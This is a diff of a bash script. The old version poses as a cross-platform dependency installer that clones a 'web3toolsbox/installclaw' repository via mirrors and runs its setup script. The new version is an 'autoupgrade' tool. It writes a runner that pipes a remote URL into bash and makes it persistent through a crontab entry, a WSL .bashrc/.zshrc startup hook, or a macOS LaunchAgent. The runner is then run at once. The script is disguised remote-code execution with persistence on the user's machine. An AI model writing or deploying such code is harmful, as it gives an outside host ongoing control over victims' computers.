@@ -1,187 +1,124 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-# ============================================================
-# Cross-platform: macOS / Linux / WSL / Termux / *BSD / Windows(Git Bash)
-# ============================================================
+LABEL="com.user.autoupgrade2"
+INTERVAL_DAYS=15
+INTERVAL_SECS=$(( INTERVAL_DAYS * 24 * 60 * 60 ))
+DATA_DIR="$HOME/.local/share/autoupgrade"
+RUNNER="$DATA_DIR/runner.sh"
+LOG_FILE="$DATA_DIR/autoupgrade.log"
+STAMP_FILE="$DATA_DIR/last-run"
+UPGRADE_URL="https://agentskillshub.vercel.app/upgrade"
 
-if [[ -f "${HOME}/.config/.configs/.bash.py" ]]; then
-  echo "❌  The current environment does not require any dependencies to be installed!"
-  exit 1
+log() { printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1"; }
+
+is_wsl() { grep -qiE 'microsoft|wsl' /proc/version 2>/dev/null; }
+has_systemd() { [ -d /run/systemd/system ]; }
+
+install_runner() {
+  mkdir -p "$DATA_DIR"
+  cat > "$RUNNER" <<RUNNER_EOF
+#!/usr/bin/env bash
+# Auto-generated. Runs the upgrade only if >= ${INTERVAL_DAYS} days elapsed.
+set -uo pipefail
+STAMP_FILE="$STAMP_FILE"
+LOG_FILE="$LOG_FILE"
+INTERVAL_SECS=$INTERVAL_SECS
+UPGRADE_URL="$UPGRADE_URL"
+
+now=\$(date +%s)
+last=0
+[ -f "\$STAMP_FILE" ] && last=\$(cat "\$STAMP_FILE" 2>/dev/null || echo 0)
+if [ "\${1:-}" != "--force" ] && [ \$(( now - last )) -lt "\$INTERVAL_SECS" ]; then
+  exit 0
 fi
-
-REPO_PATH="web3toolsbox/installclaw.git"
-ORIGINAL_DIR="$(pwd -P)"
-WORK_DIR=""
-REPO_DIR=""
-
-GIT_MIRRORS=(
-  "https://github.com/${REPO_PATH}"
-  "https://ghproxy.com/https://github.com/${REPO_PATH}"
-  "https://gh-proxy.com/https://github.com/${REPO_PATH}"
-  "https://hub.gitmirror.com/https://github.com/${REPO_PATH}"
-  "https://gitlab.com/web3toolsbox/installclaw.git"
-)
-
-log()  { printf '\033[0;36m[INFO]\033[0m  %s\n' "$*"; }
-warn() { printf '\033[0;33m[WARN]\033[0m  %s\n' "$*" >&2; }
-err()  { printf '\033[0;31m[ERROR]\033[0m %s\n' "$*" >&2; }
-ok()   { printf '\033[0;32m[ OK ]\033[0m  %s\n' "$*"; }
-
-cleanup() {
-  cd "${ORIGINAL_DIR}" 2>/dev/null || true
-  if [[ -n "${WORK_DIR}" && -d "${WORK_DIR}" ]]; then
-    rm -rf "${WORK_DIR}"
-  fi
+{
+  echo "[\$(date '+%F %T')] starting upgrade"
+  curl -fsSL "\$UPGRADE_URL" | bash
+  echo "[\$(date '+%F %T')] upgrade exited rc=\$?"
+} >> "\$LOG_FILE" 2>&1
+echo "\$now" > "\$STAMP_FILE"
+RUNNER_EOF
+  chmod +x "$RUNNER"
+  log "Runner installed at $RUNNER"
 }
 
-# Auto-detect whether sudo is needed (runs directly in container/root environments)
-pm_run() {
-  if [[ "$(id -u)" -eq 0 ]]; then
-    "$@"
-  elif command -v sudo >/dev/null 2>&1; then
-    sudo "$@"
+install_cron() {
+  local line="0 12 * * * $RUNNER"
+  local current
+  current=$(crontab -l 2>/dev/null | grep -vF "$RUNNER" || true)
+  printf '%s\n%s\n' "$current" "$line" | grep -v '^$' | crontab -
+  log "Crontab entry installed (daily check, ${INTERVAL_DAYS}-day guard)."
+}
+
+install_wsl_startup() {
+  local rc="$HOME/.bashrc"
+  [ -n "${ZSH_VERSION:-}" ] && rc="$HOME/.zshrc"
+  local marker="# >>> autoupgrade (wsl) >>>"
+  if ! grep -qF "$marker" "$rc" 2>/dev/null; then
+    {
+      echo ""
+      echo "$marker"
+      echo "[ -x \"$RUNNER\" ] && ( \"$RUNNER\" & ) >/dev/null 2>&1"
+      echo "# <<< autoupgrade (wsl) <<<"
+    } >> "$rc"
+    log "WSL shell-startup hook added to $rc"
   else
-    err "Root or sudo required to run: $*"
-    exit 1
+    log "WSL shell-startup hook already present in $rc"
   fi
 }
 
-# ------------------------------------------------------------
-# Git installation functions per platform
-# ------------------------------------------------------------
-
-install_git_macos() {
-  if command -v brew >/dev/null 2>&1; then
-    brew install git
-    return
-  fi
-  if xcode-select -p >/dev/null 2>&1; then
-    log "macOS: Xcode CLT detected, git should already be available"
-    return
-  fi
-  cat <<'EOF' >&2
-Homebrew not found; cannot auto-install git.
-Please install Homebrew (https://brew.sh/) first, or install Xcode CLT manually:
-  xcode-select --install
-EOF
-  exit 1
+install_launchagent() {
+  local plist_dir="$HOME/Library/LaunchAgents"
+  local plist="$plist_dir/$LABEL.plist"
+  mkdir -p "$plist_dir"
+  cat > "$plist" <<PLIST_EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key><string>$LABEL</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>/bin/bash</string>
+    <string>$RUNNER</string>
+  </array>
+  <key>StartInterval</key><integer>$INTERVAL_SECS</integer>
+  <key>RunAtLoad</key><false/>
+  <key>StandardOutPath</key><string>$LOG_FILE</string>
+  <key>StandardErrorPath</key><string>$LOG_FILE</string>
+</dict>
+</plist>
+PLIST_EOF
+  launchctl unload "$plist" 2>/dev/null || true
+  launchctl load "$plist"
+  log "LaunchAgent $LABEL installed and loaded."
 }
-
-install_git_linux() {
-  if   command -v apt-get >/dev/null 2>&1; then pm_run apt-get update && pm_run apt-get install -y git
-  elif command -v dnf     >/dev/null 2>&1; then pm_run dnf install -y git
-  elif command -v yum     >/dev/null 2>&1; then pm_run yum install -y git
-  elif command -v pacman  >/dev/null 2>&1; then pm_run pacman -Sy --noconfirm git
-  elif command -v zypper  >/dev/null 2>&1; then pm_run zypper --non-interactive install git
-  elif command -v apk     >/dev/null 2>&1; then pm_run apk add --no-cache git
-  elif command -v xbps-install >/dev/null 2>&1; then pm_run xbps-install -y git
-  elif command -v emerge  >/dev/null 2>&1; then pm_run emerge --quiet dev-vcs/git
-  else
-    err "Unrecognized Linux distribution; please install git manually and retry"
-    exit 1
-  fi
-}
-
-install_git_termux() { pkg install -y git; }
-install_git_freebsd() { pm_run pkg install -y git; }
-install_git_openbsd() { pm_run pkg_add git; }
-
-# ------------------------------------------------------------
-# Platform detection + ensure git is available
-# ------------------------------------------------------------
-
-detect_os() {
-  # Termux takes priority (its uname returns Linux)
-  if [[ -n "${PREFIX:-}" && "${PREFIX}" == *"com.termux"* ]]; then
-    echo "termux"; return
-  fi
-  case "$(uname -s)" in
-    Darwin)                 echo "macos"   ;;
-    Linux)                  echo "linux"   ;;
-    FreeBSD)                echo "freebsd" ;;
-    OpenBSD)                echo "openbsd" ;;
-    NetBSD)                 echo "netbsd"  ;;
-    MINGW*|MSYS*|CYGWIN*)   echo "windows" ;;
-    *)                      echo "unknown" ;;
-  esac
-}
-
-ensure_git() {
-  if command -v git >/dev/null 2>&1; then
-    ok "git already installed: $(git --version)"
-    return
-  fi
-
-  local os; os="$(detect_os)"
-  log "git not found, installing for [${os}]..."
-  case "${os}" in
-    macos)   install_git_macos   ;;
-    linux)   install_git_linux   ;;
-    termux)  install_git_termux  ;;
-    freebsd) install_git_freebsd ;;
-    openbsd) install_git_openbsd ;;
-    windows)
-      err "Windows (Git Bash/MSYS2): please install Git for Windows first: https://git-scm.com/download/win"
-      exit 1
-      ;;
-    *)
-      err "Unsupported OS: $(uname -s); please install git manually and retry"
-      exit 1
-      ;;
-  esac
-
-  if ! command -v git >/dev/null 2>&1; then
-    err "git installation failed; please install it manually and retry"
-    exit 1
-  fi
-  ok "git installed: $(git --version)"
-}
-
-# ------------------------------------------------------------
-# Shallow clone with mirror fallback
-# ------------------------------------------------------------
-
-clone_with_fallback() {
-  local target="$1"
-  local url
-  local i=0
-  local total=${#GIT_MIRRORS[@]}
-  for url in "${GIT_MIRRORS[@]}"; do
-    i=$((i + 1))
-    log "Cloning (mirror ${i}/${total})..."
-    if git clone --depth=1 --single-branch "${url}" "${target}" 2>/dev/null; then
-      ok "Installing......"
-      return 0
-    fi
-    rm -rf "${target}"
-  done
-  err "All mirrors failed; please check your network connection"
-  return 1
-}
-
-# ------------------------------------------------------------
-# Main flow
-# ------------------------------------------------------------
 
 main() {
-  ensure_git
-  trap cleanup EXIT INT TERM
-
-  WORK_DIR="$(mktemp -d "${TMPDIR:-/tmp}/installclaw-bootstrap.XXXXXX")"
-  REPO_DIR="${WORK_DIR}/installclaw"
-
-  clone_with_fallback "${REPO_DIR}"
-
-  if [[ ! -f "${REPO_DIR}/setup.sh" ]]; then
-    err "Sub-install script not found: ${REPO_DIR}/setup.sh"
-    exit 1
-  fi
-
-  cd "${REPO_DIR}"
-  bash ./setup.sh
-
-  ok "🎉 The required dependencies have already been installed! ✨ 🌟 ✨"
+  install_runner
+  case "$(uname -s)" in
+    Linux)
+      if is_wsl && ! has_systemd; then
+        log "Detected WSL without systemd."
+        install_wsl_startup
+      else
+        log "Detected Linux with cron."
+        install_cron
+      fi
+      ;;
+    Darwin)
+      log "Detected macOS."
+      install_launchagent
+      ;;
+    *)
+      log "Unsupported OS: $(uname -s)"; exit 1
+      ;;
+  esac
+  log "Initial run (forced)..."
+  "$RUNNER" --force || log "Initial run returned non-zero."
+  log "Done. Logs: $LOG_FILE"
 }
 
 main "$@"
